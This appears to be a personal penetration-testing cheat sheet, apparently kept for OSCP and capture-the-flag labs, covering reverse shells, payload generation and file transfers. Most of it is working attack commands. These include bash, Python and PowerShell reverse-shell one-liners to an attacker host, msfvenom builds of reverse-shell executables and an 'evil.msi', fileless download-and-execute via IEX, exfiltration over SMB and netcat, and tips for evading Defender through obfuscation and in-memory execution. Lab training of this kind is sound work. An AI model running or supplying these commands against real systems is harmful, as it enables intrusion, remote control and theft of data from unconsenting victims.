---
tags: [methodology, shells, payloads, transfers]
---

# 07 — Shells & File Transfers

> Back to [[00 - Index (MOC)]]. Catching, stabilizing, and upgrading shells + moving tools onto targets. Small mistakes here waste the most time.

## Listeners
```bash
rlwrap nc -lvnp 443            # STAGELESS payloads (shell_reverse_tcp) — rlwrap for history/arrows
penelope -p 443               # auto-upgrades TTY, logs, multi-session → [[penelope]]
# STAGED payloads (meterpreter/*) MUST use msfconsole multi/handler, NOT nc
```
> **Lesson:** a **staged** payload caught with plain `nc` connects then instantly dies (nc can't serve stage 2). Use `shell_reverse_tcp` (stageless) with nc, or a Metasploit handler for meterpreter.
> Prefer **443/80/53** as LPORT — egress filters often allow them.

## Reverse shell one-liners
```bash
# Linux
bash -i >& /dev/tcp/$LHOST/443 0>&1
python3 -c 'import socket,pty,os;s=socket.socket();s.connect(("'$LHOST'",443));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
# Windows PowerShell (base64 it: iconv -t UTF-16LE | base64 -w0 → powershell -e <b64>)
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('$LHOST',443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r+'PS> ');$s.Write($sb,0,$sb.Length);$s.Flush()}"
```
Reference generator: https://www.revshells.com

## msfvenom quick refs
```bash
msfvenom -p linux/x64/shell_reverse_tcp   LHOST=$LHOST LPORT=443 -f elf  -o sh.elf
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f exe  -o sh.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f aspx -o sh.aspx
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f msi  -o evil.msi
```
> **Lesson (Chatterbox):** always **read a public PoC before running it** — many ship shellcode that just pops `calc.exe`. Replace `buf` with your own payload, matching the encoder/badchars/`BufferRegister`. Check `python2` vs `python3` and the target IP inside the script.

---

## Stabilize a Linux shell (TTY upgrade)
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl-Z
stty raw -echo; fg
# (enter)
export TERM=xterm; export SHELL=bash
stty rows 50 cols 200        # match your terminal (stty -a locally)
```
Or just use [[penelope]] which does this automatically.

## Windows shell notes
- `nc.exe -e` dying instantly → that build lacks `-e`; use a **PowerShell** reverse shell instead.
- Flaky reverse shell breaking privesc tools → run them **through a cmd webshell** (fresh cmd per request, more stable).

---

## File transfers

### To the target
```bash
# Kali serve (from www/):
python3 -m http.server 8000

# Windows pull
curl http://$LHOST:8000/tool.exe -o C:\Windows\Temp\tool.exe
certutil -urlcache -f http://$LHOST:8000/tool.exe tool.exe
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://$LHOST:8000/x.ps1')"   # FILELESS

# Linux pull
wget http://$LHOST:8000/linpeas.sh -O /tmp/lp.sh
curl http://$LHOST:8000/linpeas.sh -o /tmp/lp.sh
```

### From the target (exfil)
```bash
# SMB (great for Windows)
impacket-smbserver share . -smb2support         # Kali
copy file.txt \\$LHOST\share\                     # Windows
# nc
nc -lvnp 9001 > out.bin        # Kali;  nc $LHOST 9001 < file    # target
# base64 paste (small files, any shell)
base64 -w0 file           # copy → base64 -d on the other side
```

### Defender ate the tool?
Download completes but the file vanishes / `dir` empty = quarantined (winPEAS, RunasCs, potatoes, msfvenom EXEs).
```cmd
powershell -c "Get-MpThreatDetection | Select -Last 3"
```
Workarounds: `.bat`/`.ps1` variants · run **from memory** (`IEX`) · obfuscated builds · **cmd-exec webshell** (no shellcode to flag) · rename the binary.

---

## Finding files / flags on a shell
The #1 rule: **know which shell you're in.** `PS C:\>` = PowerShell, `C:\>` = cmd. Their search syntax is different and mixing them silently returns nothing.

### Linux
```bash
find / -name flag.txt 2>/dev/null            # exact name
find / -iname "*flag*" 2>/dev/null           # case-insensitive, catches FLAG/flag.php/proof
find / -type f -iname "*flag*" 2>/dev/null   # files only
locate flag.txt                              # instant if updatedb has run
grep -rIl "OS{" / 2>/dev/null                # search file CONTENTS for the flag format
```
Check first, before a full `/` sweep: `/root/  /home/*/  /tmp/  /var/www/  /opt/`
`2>/dev/null` is mandatory — without it permission-denied spam buries the one hit.

### Windows — cmd (`C:\>`)
```cmd
dir C:\flag.txt /s /b 2>nul                  :: /s recurse, /b bare paths
dir C:\ /s /b 2>nul | findstr /i flag        :: filter all filenames for "flag"
findstr /s /i /m "OS{" C:\*.txt              :: search file CONTENTS across C:
where /r C:\ flag.txt                        :: locate by name
```

### Windows — PowerShell (`PS C:\>`)
```powershell
Get-ChildItem C:\ -Recurse -Filter *flag* -ErrorAction SilentlyContinue | Select -Expand FullName
Get-ChildItem C:\ -Recurse -Include *flag*.txt -File -ErrorAction SilentlyContinue
Select-String -Path C:\Users\*\* -Pattern "OS{" -ErrorAction SilentlyContinue   # search contents
```
> **cmd syntax in a PowerShell prompt does nothing useful.** `dir /s /b /a-d` — the `/s /b` are read as paths, not flags. If you want cmd syntax while in PS, wrap it: `cmd /c "dir C:\ /s /b 2>nul | findstr /i flag"`.

### OSCP exam proof files (not "flag.txt")
`local.txt` (user) and `proof.txt` (root/admin) — on the **Desktop of the compromised user**:
```cmd
type C:\Users\<user>\Desktop\local.txt
type C:\Users\Administrator\Desktop\proof.txt
```
```bash
cat /home/<user>/local.txt ; cat /root/proof.txt
```

### Saving output (redirect gotchas)
- `>` overwrites, `>>` appends. Don't clobber a file you already dropped (e.g. an existing `output.txt`).
- **Redirect to a FILE, not a directory** — `> C:\temp` fails; `> C:\temp\out.txt` works.
- **Write where you have permission** — low-priv can't write `C:\`. Use `C:\temp\`, `C:\Users\Public\`, or `/tmp/`.
```cmd
cmd /c "dir C:\ /s /b 2>nul | findstr /i flag" > C:\temp\out.txt & type C:\temp\out.txt
```


## References
- revshells: https://www.revshells.com
- HackTricks file transfer: https://book.hacktricks.xyz/generic-methodologies-and-resources/exfiltration
- GTFOBins (download/upload primitives): https://gtfobins.github.io
